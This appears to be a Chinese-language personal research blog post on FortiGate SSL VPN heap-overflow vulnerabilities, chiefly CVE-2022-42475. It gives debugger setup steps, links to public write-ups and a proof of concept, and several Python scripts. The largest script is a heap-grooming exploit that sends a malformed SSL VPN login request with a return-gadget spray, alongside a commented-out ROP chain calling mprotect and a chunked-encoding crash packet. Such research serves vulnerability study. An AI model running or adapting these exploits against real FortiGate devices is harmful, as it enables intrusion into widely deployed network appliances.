---
title: Fortigate研究分析
date: 2025-04-18 01:32:40 +0800
categories: 
tags: 
permalink: /posts/id=106/
pin: false
published:
---
无符号数只占4字节0 到 FFFF FFFF

有符号数0x80000000 0x7FFFFFFF


flatkc 是一个 x86 镜像，所以在 Linux 源码中找到 arch/x86/boot/compressed 目录

nano ctrl+w找字符串

x/10x $esp

git代理
 `~/.gitconfig`

终端代理

```
env|grep -I proxy
```


```python
import socket
import time
import argparse

TARGET = 'xxxxxxxxxxxx'  # Target IP
PORT = 443  # Target port, usually 443 for SSL VPN

def make_sock(target, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((target, port))
    return sock

def send_payload(payload, target, port):
    with make_sock(target, port) as ssock:
        ssock.sendall(payload)
        



```


```python
import socket
import time
import argparse

hostname = ""
port = 

def create_ssock(hostname, port):
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.connect((target, port))
	return sock

pkt = b"""\
GET / HTTP/1.1
Host: %s
Transfer-Encoding: chunked

%s\r\n%s\r\n\r\n""" % (hostname.encode(), b"0"*((0x202e//2)-2), b"a")

ssock = create_ssock(hostname, port)
ssock.send(pkt)
ssock.recv(4096)
```



## CVE-2022-42475

### 调试

调试部分更新一下
首先是固件打包，仍然是repack脚本即可，删除bin目录可以注释掉(低版本磁盘空间不够需要删掉)

```shell
sudo gdb -x sp1.gdb
```


```
# sp1.gdb

file ./flatkc.elf
set architecture i386:x86-64
b *0xffffffff807ac11c
python import time; time.sleep(10)
target remote 192.168.0.90:12345
c
set {char[10]} 0xFFFFFFFF808F3591 = "/bin/init"
x/s 0xFFFFFFFF808F3591
c

```

紧接着启动飞塔镜像即可(事实上这里fgt_verify返回的是0)


遇到的一些问题

 + fortigate虚拟机attach上后，c就断掉，显示errot detected on fd 12

![img_v3_02jn_5dea698f-5c57-4ab8-b5ca-fcc1cc6f48eg.jpg](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img_v3_02jn_5dea698f-5c57-4ab8-b5ca-fcc1cc6f48eg.jpg)

我在thinkbook14+上遇到这个问题，解决这个问题我进行了以下操作

+ 彻底关闭hyperv[ https://htlsmile.github.io/2024/06/10/VMware-Workstation-%E8%99%9A%E6%8B%9F%E5%8C%96%E5%BC%95%E6%93%8E%E8%AE%BE%E7%BD%AE/#%E5%B9%B2%E8%B4%A7 ]
+ 关闭了windows的内核保护和内存完整性保护
+ 更新了vmware(这个应该没影响)

同时也解决了ubuntu桥接获取不到IP的问题

+ 多次更换磁盘里的rootfs.gz，导致fortigate虚拟启动读完load就反复重启

我先是将磁盘里的rootfs.gz换成原本的，看是否是镜像出现问题。如果换完以后能正常启动，再进行换rootfs.gz的操作

+ 启动报错Remote I/O error

```shell
Python Exception <class 'gdb.error'>: Remote I/O error: Function not implemented ./gdbscript:4: Error in sourced command file: Error while executing Python code. 
(remote) gef➤
```

发现使用原生gdb并没有这个问题，考虑到gef最近更新过，这里换用pwndbg就解决了




启动后可以先配置好sslvpn，第一次登录需要密钥，用工具生成导入即可
https://github.com/rrrrrrri/fgt-gadgets


回到终端执行

```shell
diagnose hardware smartctl
```

用telnet连上shell

```
telnet 192.168.0.193 22
```


调试前需要手动开启23端口

```
FortiGate # config system interface 
FortiGate (interface) # edit port1
FortiGate (lan) # append allowaccess telnet 
FortiGate (lan) # end
```

注册下busybox

```shell
busybox --install -s /usr/bin
busybox mkdir -p /usr/bin
```

在fortigate里启动gdbserver

```shell
killall telnetd && gdbserver 192.168.0.193:23 --attach `pidof sslvpnd`
```


### 漏洞分析

通过在内存分配函数下断点，记录分配大小，

```
b *0x1780b1b
```

CVE：
https://bestwing.me/CVE-2023-27997-FortiGate-SSLVPN-Heap-Overflow.html
https://bestwing.me/PanOS-CVE-2024-3400-command-inject.html
https://blog.lexfo.fr/xortigate-cve-2023-27997.html
https://bestwing.me/CVE-2022-42475-FortiGate-SSLVPN-HeapOverflow.html
https://wzt.ac.cn/2022/12/15/CVE-2022-42475/#%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90
https://ioo0s.art/2023/02/09/CVE-2022-42475/#%E6%9E%84%E9%80%A0%E6%89%A7%E8%A1%8C-rop
http://blog.e4l4.com/posts/id=58/
CVE-2023-27997 FortiGate SSLVPN 堆溢出漏洞分析与利用 
https://www.cnblogs.com/L1nyun/articles/18421524
CVE-2022-42475 FortiGate SSLVPN 堆溢出漏洞分析与利用(奇安信攻防社区)
https://forum.butian.net/share/2166
FortiGate SSLVPN CVE-2024-21762漏洞利用分析
https://mp.weixin.qq.com/s?__biz=Mzk0OTU2ODQ4Mw==&mid=2247484811&idx=1&sn=2e0407a32ba0c2925d6d857f4cdf7cbb&chksm=c3571307f4209a110d6b28cea9fe59ac0f0a2079c998a682e919860f397ea647fa0794933906&mpshare=1&scene=1&srcid=0313EaETjGzEAvOdByUt6ovU&sharer_shareinfo=1fce317285bafe87be6a66e8b64ed02b&sharer_shareinfo_first=1fce317285bafe87be6a66e8b64ed02b#rd
https://github.com/h4x0r-dz/CVE-2024-21762/blob/main/poc.py
ssl源码：
https://github.dev/openssl/openssl/tree/openssl-3.0.0
fortigate debug环境搭建
https://wzt.ac.cn/2024/04/02/fortigate_debug_env2/#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99


```python
import socket
import ssl
import time
import argparse
from pwn import *

hostname = "192.168.0.193"
port = 10443

path = "/remote/login".encode()

def create_ssock(target, port):
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.connect((target, port))
	return sock

def create_ssl_ctx(target,port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((target, port))
    ctx = ssl._create_unverified_context()
    sock = ctx.wrap_socket(sock)
    return sock


ret = 0x000000000043a016

# payload = b"x" * 0x50000+b'a'*0x2e00+ b'b'*0xa0 #(3613 - 192)

def do_exploit(padding):
    socks = []
    for i in range(60):
        sk = create_ssl_ctx(hostname,port)
        data = b"POST " + path + b" HTTP/1.1\r\nHost: 192.168.0.193\r\nContent-Length: 100\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: text/plain;charset=UTF-8\r\nAccept: */*\r\n\r\na=1"
        sk.sendall(data)
        socks.append(sk)

    for i in range(20, 40, 2):# 10
        sk = socks[i]
        sk.close()
        socks[i] = None

    CL = "115964116992" # 0x1B00000000
    data  = b"POST " + path + b" HTTP/1.1\r\n"
    data += b"Host: "+hostname.encode()+ b"\r\n"
    data += b"Content-Length: " + CL.encode() + b"\r\n"
    data += b"User-Agent: Mozilla/5.0\r\n"
    data += b"Content-Type: text/plain;charset=UTF-8\r\n"
    data += b"Accept: */*\r\n"
    data += b"\r\n"
    data += b""

    exp_sk = create_ssl_ctx(hostname,port)
    for i in range(20):
        sk = create_ssl_ctx(hostname,port)
        socks.append(sk)

    # print(len(data))
    exp_sk.sendall(data)
    payload = p64(ret) * padding + b'A' * 0x1000
    exp_sk.sendall(payload)

    for sk in socks:
        if sk:
            data = b"b" * 40
            sk.sendall(data)

    return 1

for i in range(1000,2000):
    padding = int(i )
    print(i)
    if do_exploit(padding):
        continue
    else:
        print('timeout ...')
        break
    
# """
# 0x0000000001356e88 : mov rax, rdx ; pop rbp ; ret
# 0x0000000000550a38 : mov rax, rdx ; ret

# 0x000000000076e03e : pop rcx ; ret
# 0x0000000002c2c9b0 : and rax, rcx ; ret

# 0x000000000053d5a5 : pop rdi ; ret
# 0x0000000000687c69 : pop rsi ; ret
# 0x0000000001f407f4 : mov rdx, rax ; sub rdx, rdi ; sub qword ptr [rsi], rdx ; ret

# 0x0000000000687c69 : pop rsi ; ret
# 0x000000000045da22 : mov rdi, rdx ; test esi, esi ; jne 0x45da30 ; ret

# 0x0000000000687c69 : pop rsi ; ret

# 0x000000000043f942 : pop rdx ; ret

# 0x00000000005ecfe6 : jmp rsp

# """

# mov_rax_rdx_ret = 0x0000000000550a38
# pop_rcx_ret = 0x000000000076e03e
# and_rax_rcx_ret = 0x0000000002c2c9b0
# pop_rdi_ret = 0x000000000053d5a5
# pop_rsi_ret = 0x0000000000687c69
# mov_rdx_rax_ret = 0x0000000001f407f4
# mov_rdi_rdx_ret = 0x000000000045da22
# pop_rdx_ret = 0x000000000043f942
# mprotect_plt = 0x0043F460
# jmp_rsp = 0x00000000005ecfe6

# gadget = b""
# gadget += pwn.p64(mov_rax_rdx_ret)

# # for dirty write, 进程会修改该处栈数据
# gadget += pwn.p64(pop_rcx_ret)
# gadget += pwn.p64(0x0000000001356e88)

# gadget += pwn.p64(pop_rcx_ret)
# gadget += pwn.p64(0xfffffffffffff000)
# gadget += pwn.p64(and_rax_rcx_ret)
# gadget += pwn.p64(pop_rdi_ret)
# gadget += pwn.p64(0)
# gadget += pwn.p64(pop_rsi_ret)
# gadget += pwn.p64(writeable_address)
# gadget += pwn.p64(mov_rdx_rax_ret)
# gadget += pwn.p64(pop_rsi_ret)
# gadget += pwn.p64(0)
# gadget += pwn.p64(mov_rdi_rdx_ret)
# gadget += pwn.p64(pop_rsi_ret)
# gadget += pwn.p64(0x4000)
# gadget += pwn.p64(pop_rdx_ret)
# gadget += pwn.p64(7)
# gadget += pwn.p64(mprotect_plt)
# gadget += pwn.p64(jmp_rsp)

# gadget += b"\xf8" * 12

# assert(len(gadget) <= 192)

# victim_obj = gadget
# victim_obj += b"\xf2" * (192 - len(victim_obj))
# victim_obj += pwn.p64(stack_povit)
# payload += victim_obj

# exp_sk.sendall(payload)

# for sk in socks:
#     if sk:
#         data = b"b" * 40
#         sk.sendall(data)


# pkt = b"""\
# GET / HTTP/1.1
# Host: %s
# Transfer-Encoding: chunked

# %s\r\n%s\r\n\r\n""" % (hostname.encode(), b"0"*((0x202e//2)-2), b"a")

# ssock = create_ssock(hostname, port)
# ssock.send(pkt)
# ssock.recv(4096)
```










## FortiGate SSLVPN CVE-2024-21762漏洞利用分析

https://mp.weixin.qq.com/s?__biz=Mzk0OTU2ODQ4Mw==&mid=2247484811&idx=1&sn=2e0407a32ba0c2925d6d857f4cdf7cbb&chksm=c3571307f4209a110d6b28cea9fe59ac0f0a2079c998a682e919860f397ea647fa0794933906&mpshare=1&scene=1&srcid=0313EaETjGzEAvOdByUt6ovU#rd

